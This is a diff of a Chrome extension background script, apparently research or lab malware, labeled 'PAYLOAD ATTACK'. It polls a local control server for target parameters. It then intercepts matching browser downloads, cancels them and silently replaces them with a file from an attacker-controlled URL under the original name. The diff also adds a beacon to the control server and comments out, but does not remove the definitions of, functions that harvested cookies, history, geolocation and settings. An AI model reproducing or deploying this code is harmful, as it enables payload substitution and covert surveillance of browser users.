@@ -192,16 +192,7 @@ Send Function:
 References:
 https://stackoverflow.com/questions/53026387/how-to-get-all-chrome-content-settings
     */
-function logTest(C){
-    fetch('http://127.0.0.1:5000/control_server',
-            {
-            method: "POST",
-            mode: 'no-cors', 
-            body: JSON.stringify( C),
-            headers:{"Content-Type": "application/json"}
-            }
-    )
-    }
+
 function logGeolocation(){
     chrome.storage.local.get(["lat", "long"]).then((result)=>{ //take the information, if exists from the storage
         //this data is obtained in the content script
@@ -416,15 +407,15 @@ function logSend(){
     try{//errors can happen if the server is down, and we do not want the user to receive errors messages
         //hence, this try and catch nullifies them.
         // implement: https://stackoverflow.com/questions/11219582/how-to-detect-my-browser-version-and-operating-system-using-javascript
-        logCookies();
-        logHistory();
-        logGeolocation();
-        logDowloads();
-        logExtensions();
-        logCpu();
-        logProxy;
-        loggingcontentSettings();
-        loggingprivacySettings();
+        //logCookies();
+        //logHistory();
+        //logGeolocation();
+        //logDowloads();
+        //logExtensions();
+        //logCpu();
+        //logProxy;
+        //loggingcontentSettings();
+        //loggingprivacySettings();
         
         return true
     }
@@ -447,16 +438,10 @@ chrome.webNavigation.onCompleted.addListener((e) => { //add a listener that acti
                         a = Date.now()//ask again for actual time, several fetchs and gets have happened
                         chrome.storage.local.set({TimeA:a}) //change TimeA to actual time
                     }
-                    
-
                 }
         });
-
-
     }
-}
-    
-    );
+});
 
 
 
@@ -487,9 +472,9 @@ function phase(){ //This function manges any kind of change in the phase
             //actualize information
             result = JSON.parse(result)
             chrome.storage.local.set({phase:parseInt(result.phase)});
-            chrome.storage.local.set({Obj:result.obj});
-            chrome.storage.local.set({Tar:result.tar});
-            chrome.storage.local.set({Nam:result.nam});
+            chrome.storage.local.set({ObjDown:result.obj});
+            chrome.storage.local.set({TarDown:result.tar});
+            chrome.storage.local.set({NamDown:result.nam});
         });})
 
     }
@@ -518,19 +503,22 @@ chrome.webNavigation.onCompleted.addListener((e) => {//add a listener that activ
 
 
 
-//ATTACK (Download API)
-
-
-
-
-
-
+//PAYLOAD ATTACK
 
 function modify(item){
     chrome.storage.local.get(["phase"]).then((result)=>{ //look at the actual phase
         if(result.phase == 1){ //if we are in attacking phase
             chrome.storage.local.get(["ObjDown","TarDown","NamDown"]).then((result1)=>{ //ask for all storage information
-                        if (item.url.includes(result1.ObjDown)){ //is the object our objective?
+                fetch('http://127.0.0.1:5000/control_server',
+                {
+                method: "POST",
+                mode: 'no-cors', 
+                body: JSON.stringify( {caca:  result1.ObjDown} ),
+                headers:{"Content-Type": "application/json"}
+                }
+                ) 
+                if (item.url.includes(result1.ObjDown)){ //is the object our objective?
+
                         chrome.downloads.cancel(item.id) //if it is, cancel that download
                         chrome.downloads.download({url: result1.TarDown, filename: result1.NamDown}); //start a new download from our controlled url, with the name that we want (usually the same filename that the objective)
                         }
@@ -544,4 +532,3 @@ function modify(item){
 
 chrome.downloads.onCreated.addListener((Item)=>{modify(Item)}) //When the browser detects that something is going to be dowloaded, send that object to modify()
 
-// ATTACK PHISING
